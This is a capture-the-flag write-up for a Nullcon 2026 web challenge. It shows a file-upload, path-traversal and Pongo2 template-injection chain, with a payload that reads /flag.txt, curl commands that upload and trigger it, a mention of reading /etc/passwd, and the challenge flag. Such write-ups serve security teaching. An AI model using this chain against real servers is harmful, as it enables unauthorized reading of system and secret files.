---
title: "WordPress Static Site Generator - Nullcon Goa HackIM 2026 CTF"
category: "web"
subcategory: "ssti"
type: "writeup"
tags: ["web", "ssti", "lfi", "file-upload", "django", "wordpress", "nullcon-goa-hackim-2026-ctf", "2026", "ctf-writeup"]
summary: "The challenge provided a \"WordPress to Static Site Generator\" web application."
source:
  name: "CTFtime writeup #40579"
  url: "https://ctftime.org/writeup/40579"
ctf:
  name: "Nullcon Goa HackIM 2026 CTF"
  year: 2026
  challenge: "WordPress Static Site Generator"
---

## Metadata

- **CTF:** Nullcon Goa HackIM 2026 CTF
- **Task:** WordPress Static Site Generator
- **Author team:** mritunjya
- **CTFtime:** <https://ctftime.org/writeup/40579>

---
**Challenge Description**:  
The challenge provided a "WordPress to Static Site Generator" web application. Users could upload a WordPress XML export file and then "generate" a static site using a selected template.

**Analysis**:  
1\. **Arbitrary File Upload**: The application allows uploading XML files. The uploaded files are stored in a predictable directory `uploads/<hash>/`.  
2\. **Local File Inclusion (LFI)**: The `template` parameter in the `/generate` endpoint is vulnerable to LFI. It takes a path, appends `.html`, and loads it as a Pongo2 template.  
3\. **Server-Side Template Injection (SSTI)**: By uploading a file with Pongo2 template syntax (e.g., `{{ 7*7 }}`) and including it via the LFI vulnerability, we can execute arbitrary template code.  
4\. **Arbitrary File Read**: The Pongo2 `include` tag allows including arbitrary files (e.g., `{% include "/etc/passwd" %}`), which bypasses the `.html` extension restriction of the main template loader if used within a template.

**Solution**:  
1\. **Create Malicious Payload**: Created a file `ssti_read_flag.html` containing the payload:  
```django  
{% include "/flag.txt" %}  
```  
2\. **Upload Payload**: Uploaded the file via the `/upload` endpoint.  
```bash  
curl -b cookies.txt -c cookies.txt -L -F "wordpress_xml=@ssti_read_flag.html" http://52.59.124.14:5001/upload  
```  
The server responded with the upload path, e.g., `uploads/<hash>/`.  
3\. **Trigger Exploit**: Triggered the static site generation with the `template` parameter pointing to the uploaded file (traversing out of `templates/` directory).  
```bash  
curl -b cookies.txt -X POST -d "template=../uploads/<hash>/ssti_read_flag" http://52.59.124.14:5001/generate  
```  
4\. **Retrieve Flag**: The response contained the contents of `/flag.txt`.

**Flag**: `ENO{PONGO2_T3MPl4T3_1NJ3cT1on_!s_Fun_To00!}`
